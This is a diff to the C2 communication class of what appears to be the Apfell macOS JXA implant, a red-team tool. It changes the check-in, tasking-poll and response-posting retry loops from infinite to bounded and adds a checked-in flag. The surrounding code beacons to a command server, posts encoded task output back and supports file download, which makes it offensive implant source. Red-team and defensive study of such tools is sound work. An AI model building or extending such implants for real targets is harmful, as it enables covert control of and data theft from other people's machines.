@@ -240,13 +240,14 @@ class customC2 extends baseC2{
 			var jsondata = this.htmlPostData(info, apfell.uuid);
 		}
 		apfell.id = jsondata.id;
+		apfell.checked_in = true;
 		// if we fail to get a new ID number, then exit the application
 		if(apfell.id === undefined){ $.NSApplication.sharedApplication.terminate(this); }
 		//console.log(apfell.id);
 		return jsondata;
 	}
 	getTasking(){
-		while(true){
+		for(let i = 0; i < 10; i++){
 			try{
 				//let data = {"tasking_size":1, "action": "get_tasking"};
 				//let task = this.htmlPostData(this.url, data, apfell.id);
@@ -259,6 +260,7 @@ class customC2 extends baseC2{
 				$.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
 			}
 		}
+		return [];
 	}
 	postResponse(task, output){
 		// this will get the task object and the response output
@@ -285,7 +287,8 @@ class customC2 extends baseC2{
 			data = $(uid + JSON.stringify(sendData)).dataUsingEncoding($.NSUTF8StringEncoding);
 			data = data.base64EncodedStringWithOptions(0);
 		}
-		while(true){
+		for(let i = 0; i < 10; i++){
+			if(!apfell.checked_in){i = 0;}
 			try{ //for some reason it sometimes randomly fails to send the data, throwing a JSON error. loop to fix for now
 				//console.log("posting: " + sendData + " to " + urlEnding);
 				if( $.NSDate.date.compare(this.kill_date) === $.NSOrderedDescending ){
@@ -349,7 +352,9 @@ class customC2 extends baseC2{
 				//console.log(error.toString());
 				$.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
 			}
+
 		}
+		return {};
 	}
 	htmlGetData(){
 		let data = {"tasking_size":1, "action": "get_tasking"};
@@ -364,7 +369,8 @@ class customC2 extends baseC2{
 		let url = this.baseurl;
 		if(this.getURI !== ""){ url += "/" + this.getURI; }
 		url += "?" + this.queryPathName + "=" + data;
-		while(true){
+		for(let i = 0; i < 10; i++){
+			if(!apfell.checked_in){i = 0}
 			try{
 				if( $.NSDate.date.compare(this.kill_date) === $.NSOrderedDescending ){
 					$.NSApplication.sharedApplication.terminate(this);
@@ -414,6 +420,7 @@ class customC2 extends baseC2{
 				$.NSThread.sleepForTimeInterval(this.gen_sleep_time()); //wait timeout seconds and try again
 			}
 		}
+		return {};
 	}
 	download(task, params){
 		// download just has one parameter of the path of the file to download
